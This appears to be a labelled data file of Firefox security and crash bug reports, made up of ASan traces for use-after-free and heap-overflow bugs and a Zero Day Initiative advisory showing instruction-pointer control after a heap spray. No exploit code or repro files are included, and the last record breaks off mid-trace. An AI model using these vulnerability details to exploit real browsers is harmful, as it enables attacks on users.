heap-use-after-free in nsrefptr mozilla mediainputport operator tested on os ubuntu 12.04 firefox asan build from note to reproduce this issue you need two html-files the runner loads the actual repro-file into iframe to trigger the crash you might need to adjust the timing of settimeout reload,50 in the runner the timing seems to be cpu related and with 50ms timing i got crash reliably with local asan opt-build but was barely able to trigger the crash with the asan opt-build from tinderbox with asan debug-build i only managed to hit 100 cpu load and no crash on my laptop but christoph cdiehl was able to reproduce also with debug-build because of the nature of the bug i m not able to minimize the repro-file any further asan-output 17451==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nsrefptr mozilla mediainputport operator const home/attekett/firefox/content/media/mediastreamgraph.cpp:2490 1 in mozilla mediastreamgraphimpl runinstablestate home/attekett/firefox/content/media/mediastreamgraph.cpp:1719 2 in mozilla anonymous namespace mediastreamgraphstablestaterunnable run home/attekett/firefox/content/media/mediastreamgraph.cpp:1580 3 in nsthread processnextevent bool bool home/attekett/firefox/xpcom/threads/nsthread.cpp:766 4 in ns_processnextevent nsithread bool home/attekett/firefox/xpcom/glue/nsthreadutils.cpp:263 5 in mozilla ipc messagepump run base messagepump delegate home/attekett/firefox/ipc/glue/messagepump.cpp:95 6 in messageloop runinternal home/attekett/firefox/ipc/chromium/src/base/message_loop.cc:229 7 in nsbaseappshell run home/attekett/firefox/widget/xpwidgets/nsbaseappshell.cpp:164 8 in nsappstartup run home/attekett/firefox/toolkit/components/startup/nsappstartup.cpp:278 9 in xremain xre_mainrun home/attekett/firefox/toolkit/xre/nsapprunner.cpp:4012 10 in xremain xre_main int char nsxreappdata const home/attekett/firefox/toolkit/xre/nsapprunner.cpp:4083 11 in xre_main home/attekett/firefox/toolkit/xre/nsapprunner.cpp:4297 12 in do_main int char nsifile home/attekett/firefox/browser/app/nsbrowserapp.cpp:282 13 in 0 14 in start 0 is located 0 bytes inside of 448-byte region freed by thread t0 here 0 in interceptor_free asan_rtl 1 in mozilla dom audionode disconnectfromgraph home/attekett/firefox/content/media/webaudio/audionode.cpp:176 2 in mozilla dom audionode release home/attekett/firefox/content/media/webaudio/audionode.cpp:44 3 in nsrefptr home/attekett/firefox/objdir-ff-asan/content/media/webaudio dist/include/nsautoptr.h:870 4 in mozilla dom audionode release home/attekett/firefox/content/media/webaudio/audionode.cpp:44 5 in nsrefptr mozilla dom audionode assign_assuming_addref mozilla dom audionode home/attekett/firefox/objdir-ff-asan/content/media/webaudio dist/include/nsautoptr.h:857 6 in mozilla mediastreamgraphimpl runinstablestate home/attekett/firefox/content/media/mediastreamgraph.cpp:1719 7 in mozilla anonymous namespace mediastreamgraphstablestaterunnable run home/attekett/firefox/content/media/mediastreamgraph.cpp:1580 8 in nsthread processnextevent bool bool home/attekett/firefox/xpcom/threads/nsthread.cpp:766 9 in ns_processnextevent nsithread bool home/attekett/firefox/xpcom/glue/nsthreadutils.cpp:263 10 in mozilla ipc messagepump run base messagepump delegate home/attekett/firefox/ipc/glue/messagepump.cpp:95 11 in messageloop runinternal home/attekett/firefox/ipc/chromium/src/base/message_loop.cc:229 12 in nsbaseappshell run home/attekett/firefox/widget/xpwidgets/nsbaseappshell.cpp:164 13 in nsappstartup run home/attekett/firefox/toolkit/components/startup/nsappstartup.cpp:278 14 in xremain xre_mainrun home/attekett/firefox/toolkit/xre/nsapprunner.cpp:4012 15 in xremain xre_main int char nsxreappdata const home/attekett/firefox/toolkit/xre/nsapprunner.cpp:4083 16 in xre_main home/attekett/firefox/toolkit/xre/nsapprunner.cpp:4297 17 in do_main int char nsifile home/attekett/firefox/browser/app/nsbrowserapp.cpp:282 18 in 0 previously allocated by thread t0 here 0 in interceptor_malloc asan_rtl 1 in moz_xmalloc home/attekett/firefox/memory/mozalloc/mozalloc.cpp:52 2 in operator new unsigned long home/attekett/firefox/objdir-ff-asan/content/media dist/include/mozilla/mozalloc.h:201 3 in convolvernode home/attekett/firefox/content/media/webaudio/convolvernode.cpp:194 4 in mozilla dom audiocontext createconvolver home/attekett/firefox/content/media/webaudio/audiocontext.cpp:342 5 in mozilla dom audiocontextbinding createconvolver jscontext js handle jsobject mozilla dom audiocontext jsjitmethodcallargs const home/attekett/firefox/objdir-ff-asan/dom/bindings/./audiocontextbinding.cpp:750 6 in mozilla dom genericbindingmethod jscontext unsigned int js value home/attekett/firefox/dom/bindings/bindingutils.cpp:2350 7 in js calljsnative jscontext bool jscontext unsigned int js value js callargs const home/attekett/firefox/js/src/jscntxtinlines.h:239 8 in interpret jscontext js runstate home/attekett/firefox/js/src/vm/interpreter.cpp:2561 9 in js runscript jscontext js runstate home/attekett/firefox/js/src/vm/interpreter.cpp:402 10 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js abstractframeptr js value home/attekett/firefox/js/src/vm/interpreter.cpp:610 11 in js execute jscontext js handle jsscript jsobject js value home/attekett/firefox/js/src/vm/interpreter.cpp:646 12 in evaluate jscontext js handle jsobject js readonlycompileoptions const js sourcebufferholder js value home/attekett/firefox/js/src/jsapi.cpp:4998 13 in nsjsutils evaluatestring jscontext js sourcebufferholder js handle jsobject js compileoptions nsjsutils evaluateoptions const js mutablehandle js value void home/attekett/firefox/dom/base/nsjsutils.cpp:256 14 in nsjsutils evaluatestring jscontext js sourcebufferholder js handle jsobject js compileoptions void home/attekett/firefox/dom/base/nsjsutils.cpp:322 15 in nsscriptloader evaluatescript nsscriptloadrequest js sourcebufferholder void home/attekett/firefox/content/base/src/nsscriptloader.cpp:1172 16 in nsscriptloader processrequest nsscriptloadrequest void home/attekett/firefox/content/base/src/nsscriptloader.cpp:1002 17 in nsscriptloader processscriptelement nsiscriptelement home/attekett/firefox/content/base/src/nsscriptloader.cpp:812 18 in nsscriptelement maybeprocessscript home/attekett/firefox/content/base/src/nsscriptelement.cpp:140 19 in nscomptr nsiscriptelement operator const home/attekett/firefox/objdir-ff-asan/parser/html dist/include/nsiscriptelement.h:220 20 in nshtml5treeopexecutor runflushloop home/attekett/firefox/parser/html/nshtml5treeopexecutor.cpp:484 21 in nshtml5executorflusher run home/attekett/firefox/parser/html/nshtml5streamparser.cpp:126 22 in nsthread processnextevent bool bool home/attekett/firefox/xpcom/threads/nsthread.cpp:766 23 in ns_processnextevent nsithread bool home/attekett/firefox/xpcom/glue/nsthreadutils.cpp:263 24 in mozilla ipc messagepump run base messagepump delegate home/attekett/firefox/ipc/glue/messagepump.cpp:95 25 in messageloop runinternal home/attekett/firefox/ipc/chromium/src/base/message_loop.cc:229 26 in nsbaseappshell run home/attekett/firefox/widget/xpwidgets/nsbaseappshell.cpp:164 27 in nsappstartup run home/attekett/firefox/toolkit/components/startup/nsappstartup.cpp:278 28 in xremain xre_mainrun home/attekett/firefox/toolkit/xre/nsapprunner.cpp:4012 29 in xremain xre_main int char nsxreappdata const home/attekett/firefox/toolkit/xre/nsapprunner.cpp:4083 summary addresssanitizer heap-use-after-free 0 shadow bytes around the buggy address fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 05 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 contiguous container oob fc asan internal fe 17451==aborting	11
use-after-free in nsdocloader onprogress pad	11
assertion not a utf-8 string this code should only be used for converting from known utf-8 strings error file dist/include/nsutf8utils.h line 427 the attached certificate causes the following failure mozilla-central c482c28b35b6 patches from bug 1015973 running test with pkix 3539 warning ns_ensure_true isutf8 input failed file netwerk/dns/nsidnservice.cpp line 293 3539 assertion not a utf-8 string this code should only be used for converting from known utf-8 strings error file dist/include/nsutf8utils.h line 427 3539 assertion not a utf-8 string this code should only be used for converting from known utf-8 strings error file dist/include/nsutf8utils.h line 427 hit moz_crash at memory/mozalloc/mozalloc_abort.cpp:30 asan sigsegv 3539==error addresssanitizer segv on unknown address pc sp bp t0 0 in mozalloc_abort char const memory/mozalloc/mozalloc_abort.cpp:30 1 in abort char const xpcom/base/nsdebugimpl.cpp:472 2 in ns_debugbreak xpcom/base/nsdebugimpl.cpp:459 3 in calculateutf8length write char const unsigned int dist/include/nsutf8utils.h:427 4 in nscharsinktraits calculateutf8length write calculateutf8length char const unsigned int dist/include/nschartraits.h:572 5 in calculateutf8length copy_string nsreadingiterator char calculateutf8length nsreadingiterator char const nsreadingiterator char const calculateutf8length dist/include/nsalgorithm.h:70 6 in appendutf8toutf16 nsacstring_internal const nsastring_internal mozilla fallible_t const xpcom/string/src/nsreadableutils.cpp:195 7 in appendutf8toutf16 nsacstring_internal const nsastring_internal xpcom/string/src/nsreadableutils.cpp:184 8 in ns_convertutf8toutf16 objdir-ff-asan64dbg/netwerk/dns dist/include/nsstring.h:169 9 in nsidnservice utf8toace nsacstring_internal const nsacstring_internal bool bool netwerk/dns/nsidnservice.cpp:170 10 in nsdnsservice asyncresolve nsacstring_internal const unsigned int nsidnslistener nsieventtarget nsicancelable netwerk/dns/nsdnsservice2.cpp:685 11 in nsdnsprefetch prefetch unsigned short netwerk/base/src/nsdnsprefetch.cpp:61 12 in mozilla net nshttpchannel beginconnect netwerk/protocol/http/nshttpchannel.cpp:4600 13 in mozilla net nshttpchannel onproxyavailable nsicancelable nsiuri nsiproxyinfo tag_nsresult netwerk/protocol/http/nshttpchannel.cpp:4710 14 in nsasyncresolverequest docallback netwerk/base/src/nsprotocolproxyservice.cpp:247 15 in nsrefptr nsasyncresolverequest operator const netwerk/base/src/nsprotocolproxyservice.cpp:139 16 in nsprotocolproxyservice asyncresolveinternal nsiuri unsigned int nsiprotocolproxycallback nsicancelable bool netwerk/base/src/nsprotocolproxyservice.cpp:1143 17 in mozilla net nshttpchannel resolveproxy netwerk/protocol/http/nshttpchannel.cpp:1826 18 in mozilla net nshttpchannel asyncopen nsistreamlistener nsisupports netwerk/protocol/http/nshttpchannel.cpp:4500 19 in nshttpdownloadevent run security/manager/ssl/src/nsnsscallbacks.cpp:157 this issue is similar to bug 1015973 but has a different cause according to comment 4 in that bug it also reproduces with the patch from that bug marked s-s until investigated and confirmed to be harmless	5
webgl app crashes firefox user agent mozilla/5.0 macintosh intel mac os x 10_9_2 applewebkit/537.36 khtml like gecko chrome/35.0.1916.153 safari/537.36 steps to reproduce browse to click click to interact to run the webgl app actual results wait 10-30 seconds and firefox crashes with a hard close and no noticeable new messages in the console this does not crash in chrome or ie 11 and did not crash before firefox 30.0 this is also reproducible in firefox 32.0a2 aurora and 33.0a1 nightly on a variety of platforms windows linux mac and gpus this application loads tiled images for different parts of the globe as it spins and creates webgl textures for them the memory pressure or use of web workers for other processing may be the problem this is also reproducible by repeatedly zooming in and out in the simpler cesium viewer application this is open-source we are happy to help debug and implement any workarounds related discussion topic/cesium-dev/6sloxrzbqj4	9
mozilla firefox directionalityutils use-after-free remote code execution vulnerability zdi-can-2394 zdi-can-2394 mozilla firefox directionalityutils use-after-free remote code execution vulnerability cvss 6.8 av n/ac m/au n/c p/i p/a p abstract hp s zero day initiative has identified a vulnerability affecting the following products mozilla firefox vulnerability details verified against firefox 30.0 stable on windows 8.1 as well as the latest nightly as of july 1st f48.9c4 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=095712b0 ebx=0c0c0000 ecx=0ddc2600 edx=0ddc2600 esi=0ddc2600 edi=0c0c0000 eip=095712b0 esp=00b1dcd8 ebp=00b1dd04 iopl=0 nv up ei ng nz na pe cy cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010287 095712b0 27 daa 0:000 kv childebp retaddr args to child warning frame ip not in any known module following frames may be wrong 00b1dcd4 60526d2c 00b1dcf0 00000002 0ddc2600 00b1dd04 60cfa9f3 00000001 0abb15b0 08712801 xul mozilla dom element updatestate fpo non-fpo conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\content\base\src\element.cpp 182 00b1dd18 61181bbc 00000002 60e78875 0abb15b0 xul mozilla dom element setdirectionality conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\obj-firefox\dist\include\mozilla\dom\element.h 325 00b1dd20 60e78875 0abb15b0 00b1dd50 00000002 xul mozilla nstextnodedirectionalitymap setnodedirection fpo 2,0,0 conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\content\base\src\directionalityutils.cpp 494 00b1dd34 60ed1d0f 0abb15b0 61181ba8 00b1dd50 xul nscheapset nsptrhashkey mozilla dom element enumerateentries fpo non-fpo conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\obj-firefox\dist\include\nscheapsets.h 68 00b1dd44 60fe2c7c 0abb15b0 00000002 60d24b09 xul mozilla nstextnodedirectionalitymap updateautodirection fpo 2,0,0 conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\content\base\src\directionalityutils.cpp 530 00b1dd50 60d24b09 08712840 00000002 00b1df1c xul mozilla nstextnodedirectionalitymap updatetextnodedirection fpo 2,0,0 conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\content\base\src\directionalityutils.cpp 571 00b1deb4 611b700b 08712840 00000002 102b9f58 xul nsgenericdomdatanode settextinternal conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\content\base\src\nsgenericdomdatanode.cpp 320 00b1decc 611b7133 00000000 00000002 00b1df1c xul nsgenericdomdatanode replacedata fpo 3,0,4 conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\content\base\src\nsgenericdomdatanode.cpp 267 00b1dee4 611b72c2 08712840 00000000 00000002 xul nsgenericdomdatanode replacedata fpo non-fpo conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\content\base\src\nsgenericdomdatanode.h 220 00b1df38 6064c573 0c1e2e40 00b1df74 08712840 xul mozilla dom characterdatabinding replacedata fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\obj-firefox\dom\bindings\characterdatabinding.cpp 281 00b1df74 636f88f0 0c1e2e40 00000003 00000028 xul mozilla dom genericbindingmethod fpo 3,6,0 conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\dom\bindings\bindingutils.cpp 2278 00b1e270 636f9c16 0c1e2e40 00000000 00b1e2e0 mozjs js invoke fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\vm\interpreter.cpp 476 00b1e320 636d483b 0c1e2e40 00b1e398 00b1e388 mozjs js invoke fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\vm\interpreter.cpp 532 00b1e3c4 00b1e43c 2580513d 0c1e2e40 00b1e48c mozjs js jit docallfallback fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\jit\baselineic.cpp 8138 00b1e3e0 00b1e3ec 00b1e3ec 00000000 ffffff82 00b1e4e8 636e0879 2c1230d4 00000001 00b1f4e0 00b1e550 6377a18b 0c1e2e40 00b1f188 00000003 mozjs enterbaseline fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\jit\baselinejit.cpp 123 00b1e5b4 636f488e 0f02c62a 0c1e2e40 08c8e800 mozjs js jit enterbaselineatbranch fpo 1,22,0 conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\jit\baselinejit.cpp 207 00b1f188 636f9937 00000000 10513920 00b1f5f0 mozjs interpret fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\vm\interpreter.cpp 1714 00b1f478 636f9c16 0c1e2e40 00000000 00b1f4e8 mozjs js invoke fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\vm\interpreter.cpp 495 00b1f52c 6374fa71 0c1e2e40 00b1f680 00b1f5c0 mozjs js invoke fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\vm\interpreter.cpp 532 00b1f554 60431727 0c1e2e40 00b1f680 00b1f5c0 mozjs js call fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\jsapi.cpp 4916 00b1f640 60449ff2 0355d4a0 00b1f680 0adb1b98 xul mozilla dom function call fpo 4,50,4 conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\obj-firefox\dom\bindings\functionbinding.cpp 35 00b1f744 605836db 00b1f780 0adb1b98 00b1f798 xul mozilla dom function call nscomptr nsisupports fpo 3,56,0 conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\obj-firefox\dist\include\mozilla\dom\functionbinding.h 58 00b1f84c 6057fc91 0c578080 0d42ac40 00b1f8dc xul nsglobalwindow runtimeouthandler fpo 1,60,0 conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\dom\base\nsglobalwindow.cpp 11877 00b1f8bc 6042c630 0d42ac40 08d4a200 6042c5ec xul nsglobalwindow runtimeout fpo 1,23,4 conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\dom\base\nsglobalwindow.cpp 12102 00b1f8dc 6056ba67 08d4a200 0d42ac40 0351b240 xul nsglobalwindow timercallback fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\dom\base\nsglobalwindow.cpp 12347 00b1f8f8 6056bbe4 604e6207 0a18f1f0 00b1f9b8 xul nstimerimpl fire fpo 0,1,4 conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\xpcom\threads\nstimerimpl.cpp 551 00b1f8fc 604e6207 0a18f1f0 00b1f9b8 0350e9b0 xul nstimerevent run fpo 1,0,0 conv stdcall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\xpcom\threads\nstimerimpl.cpp 637 00b1f97c 604c8b1d 0351b201 00000001 00b1f994 xul nsthread processnextevent fpo 3,26,0 conv stdcall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\xpcom\threads\nsthread.cpp 694 00b1f98c 606c5e1d 0351b201 00000001 0352e360 xul ns_processnextevent fpo 2,0,0 conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\xpcom\glue\nsthreadutils.cpp 263 00b1f9b8 606b9440 0052e360 bcab8a31 0351b240 xul mozilla ipc messagepump run fpo non-fpo conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\ipc\glue\messagepump.cpp 136 00b1f9f0 606b94cf 0351bbe0 00000001 00b1fa00 xul messageloop runhandler fpo non-fpo conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\ipc\chromium\src\base\message_loop.cc 220 00b1fa10 60618a5e 80000000 088315c0 6061fbaf xul messageloop run fpo non-fpo conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\ipc\chromium\src\base\message_loop.cc 194 00b1fa1c 6061fbaf 0351bbe0 60be25cf 0351bbe0 xul nsbaseappshell run fpo 1,0,0 conv stdcall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\widget\xpwidgets\nsbaseappshell.cpp 166 00b1fa30 605a9c2a 088315c0 721c1306 00b1fb44 xul nsappshell run fpo 1,0,4 conv stdcall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\widget\windows\nsappshell.cpp 165 00b1fb04 606072c6 00b1fb44 00b1fc6c 00b1fb44 xul xremain xre_mainrun fpo non-fpo conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\toolkit\xre\nsapprunner.cpp 4010 00b1fb24 60620d14 00b1fb44 00000000 024f2ff8 xul xremain xre_main fpo non-fpo conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\toolkit\xre\nsapprunner.cpp 4079 00b1fc3c 013616dd 00000001 024f2ff8 00b1fc6c xul xre_main fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\toolkit\xre\nsapprunner.cpp 4291 00b1fdd0 013619a2 00000001 024f2ff8 0351e0a0 firefox do_main fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\browser\app\nsbrowserapp.cpp 282 00b1fe64 01361aad 00000001 024f2ff8 00000000 firefox ns_internal_main fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\browser\app\nsbrowserapp.cpp 643 00b1fe98 0136237b 00000000 00f63f98 00f67f70 firefox wmain fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\toolkit\xre\nswindowswmain.cpp 112 00b1fedc 75ec17ad 7fccd000 00b1ff2c 7779db0e firefox tmaincrtstartup fpo non-fpo conv cdecl f dd\vctools\crt_bld\self_x86\crt\src\crtexe.c 552 00b1fee8 7779db0e 7fccd000 b83c25bc 00000000 kernel32 basethreadinitthunk fpo non-fpo 00b1ff2c 7779dae7 ffffffff 777e4b0e 00000000 ntdll rtluserthreadstart fpo non-fpo 00b1ff3c 00000000 0136249c 7fccd000 00000000 ntdll rtluserthreadstart fpo non-fpo 0:000 lmi mozjs loaded module info mozjs module mozjs base address 63650000 image name c program files\mozilla firefox\mozjs.dll machine type 332 i386 time stamp 53912a18 thu jun 05 19:40:24 2014 size 3b6000 checksum 3ad3a7 characteristics 2122 debug data dirs type size va pointer codeview 6f 370168 36f368 rsds guid d312fb30-1992-4bdf-8364-b3fb1e13e7ed age 2 pdb c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\obj-firefox\js\src\mozjs.pdb image type file image read successfully from debugger c program files\mozilla firefox\mozjs.dll symbol type pdb symbols loaded successfully from symbol server z export\symbols\mozjs.pdb\d312fb3019924bdf8364b3fb1e13e7ed2\mozjs.pdb compiler linker front end 0.0 bld 0 back end 10.0 bld 30319 load report private symbols lines source indexed z export\symbols\mozjs.pdb\d312fb3019924bdf8364b3fb1e13e7ed2\mozjs.pdb 0:000 lmvm mozjs start end module name 63650000 63a06000 mozjs private pdb symbols z export\symbols\mozjs.pdb\d312fb3019924bdf8364b3fb1e13e7ed2\mozjs.pdb loaded symbol image file c program files\mozilla firefox\mozjs.dll image path c program files\mozilla firefox\mozjs.dll image name mozjs.dll timestamp thu jun 05 19:40:24 2014 53912a18 checksum 003ad3a7 imagesize 003b6000 translations 0000.04b0 0000.04e4 0409.04b0 0409.04e4 0:000 lmi xul loaded module info xul module xul base address 60380000 image name c program files\mozilla firefox\xul.dll machine type 332 i386 time stamp 539141b1 thu jun 05 21:21:05 2014 size 1826000 checksum 16e4463 characteristics 2122 debug data dirs type size va pointer codeview 76 14afff8 14af3f8 rsds guid 0b4eeb73-d3ae-4584-b127-6a3931531ad3 age 2 pdb c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\obj-firefox\toolkit\library\xul.pdb image type file image read successfully from debugger c program files\mozilla firefox\xul.dll symbol type pdb symbols loaded successfully from symbol server z export\symbols\xul.pdb\0b4eeb73d3ae4584b1276a3931531ad32\xul.pdb compiler linker front end 0.0 bld 0 back end 10.0 bld 30319 load report private symbols lines source indexed z export\symbols\xul.pdb\0b4eeb73d3ae4584b1276a3931531ad32\xul.pdb 0:000 lmvm xul start end module name 60380000 61ba6000 xul private pdb symbols z export\symbols\xul.pdb\0b4eeb73d3ae4584b1276a3931531ad32\xul.pdb loaded symbol image file c program files\mozilla firefox\xul.dll image path c program files\mozilla firefox\xul.dll image name xul.dll timestamp thu jun 05 21:21:05 2014 539141b1 checksum 016e4463 imagesize 01826000 file version 30.0.0.5269 product version 30.0.0.5269 file flags 0 mask 3f file os 4 unknown win32 file type 2.0 dll file date 00000000.00000000 translations 0000.04b0 companyname mozilla foundation productname firefox internalname firefox originalfilename firefox productversion 30.0 fileversion 30.0 filedescription 30.0 legalcopyright license mpl 2 legaltrademarks mozilla comments mozilla when the spray lands properly 94.f60 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=c1c2c3c4 ebx=0c0c0000 ecx=0b7fdce0 edx=0b7fdce0 esi=0b7fdce0 edi=0c0c0000 eip=c1c2c3c4 esp=00f9dcd8 ebp=00f9dd04 iopl=0 ov up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010a06 c1c2c3c4 credit this vulnerability was discovered by regenrecht working with hp s zero day initiative	11
heap-buffer-overflow in nstransformedtextrun setcapitalization tested on os ubuntu 12.04 firefox asan debug prebuild from sometimes the repro-file fails to trigger the crash if the crash does n't occur after couple of refresh restart the browser also the crash reproduces a lot more reliably with debug-build than with opt-build asan trace 7111 assertion text run should be transformed mtextrun getflags nstextframeutils text_is_transformed file builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nstextframe.cpp line 970 7111==error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 8 at thread t0 0 in nstarray_base nstarrayinfallibleallocator nstarray_copywithmemutils length const builds/slave/m-cen-l64-asan-d-0000000000000/build/xpcom/build glue/nstarray.h:323 1 in nstarray_base nstarrayinfallibleallocator nstarray_copywithmemutils isempty const builds/slave/m-cen-l64-asan-d-0000000000000/build/obj-firefox/xpcom/base dist/include/nstarray.h:326 2 in nstransformedtextrun setcapitalization unsigned int unsigned int bool gfxcontext builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nstextruntransformations.cpp:60 3 in nslinebreaker appendtext nsiatom char16_t const unsigned int unsigned int nsilinebreaksink builds/slave/m-cen-l64-asan-d-0000000000000/build/content/base/src/nslinebreaker.cpp:291 4 in nslinebreaker appendtext nsiatom unsigned char const unsigned int unsigned int nsilinebreaksink builds/slave/m-cen-l64-asan-d-0000000000000/build/content/base/src/nslinebreaker.cpp:327 5 in buildtextrunsscanner setupbreaksinksfortextrun gfxtextrun void const unsigned int builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nstextframe.cpp:2399 6 in buildtextrunsscanner setuplinebreakercontext gfxtextrun builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nstextframe.cpp:2304 7 in buildtextrunsscanner flushframes bool bool builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nstextframe.cpp:1453 8 in buildtextruns gfxcontext nstextframe nsiframe nslinelist_iterator const nstextframe textruntype builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nstextframe.cpp:1401 9 in nstextframe ensuretextrun nstextframe textruntype gfxcontext nsiframe nslinelist_iterator const unsigned int builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nstextframe.cpp:2559 10 in nstextframe addinlineminwidthforflow nsrenderingcontext nsiframe inlineminwidthdata nstextframe textruntype builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nstextframe.cpp:7018 11 in nstextframe addinlineminwidth nsrenderingcontext nsiframe inlineminwidthdata builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nstextframe.cpp:7175 12 in nsblockframe getminwidth nsrenderingcontext builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsblockframe.cpp:733 60 in nsappstartup run builds/slave/m-cen-l64-asan-d-0000000000000/build/toolkit/components/startup/nsappstartup.cpp:278 61 in xremain xre_mainrun builds/slave/m-cen-l64-asan-d-0000000000000/build/toolkit/xre/nsapprunner.cpp:4013 62 in xremain xre_main int char nsxreappdata const builds/slave/m-cen-l64-asan-d-0000000000000/build/toolkit/xre/nsapprunner.cpp:4084 63 in xre_main builds/slave/m-cen-l64-asan-d-0000000000000/build/toolkit/xre/nsapprunner.cpp:4298 64 in do_main int char nsifile builds/slave/m-cen-l64-asan-d-0000000000000/build/browser/app/nsbrowserapp.cpp:282 65 in main builds/slave/m-cen-l64-asan-d-0000000000000/build/browser/app/nsbrowserapp.cpp:643 66 in 0 67 in start 0 is located 0 bytes to the right of 128-byte region allocated by thread t0 here 0 in interceptor_malloc asan_rtl 1 in gfxtextrun allocatestoragefortextrun unsigned long unsigned int builds/slave/m-cen-l64-asan-d-0000000000000/build/gfx/thebes/gfxfont.cpp:6461 2 in gfxtextrun create gfxtextrunfactory parameters const unsigned int gfxfontgroup unsigned int builds/slave/m-cen-l64-asan-d-0000000000000/build/gfx/thebes/gfxfont.cpp:6478 3 in gfxfontgroup maketextrun unsigned char const unsigned int gfxtextrunfactory parameters const unsigned int builds/slave/m-cen-l64-asan-d-0000000000000/build/gfx/thebes/gfxfont.cpp:5196 4 in gfxtextrun maketextrun unsigned char unsigned char const unsigned int gfxfontgroup gfxtextrunfactory parameters const unsigned int builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nstextframe.cpp:569 5 in buildtextrunsscanner buildtextrunforframes void builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nstextframe.cpp:2145 6 in buildtextrunsscanner flushframes bool bool builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nstextframe.cpp:1472 7 in buildtextruns gfxcontext nstextframe nsiframe nslinelist_iterator const nstextframe textruntype builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nstextframe.cpp:1401 8 in nstextframe ensuretextrun nstextframe textruntype 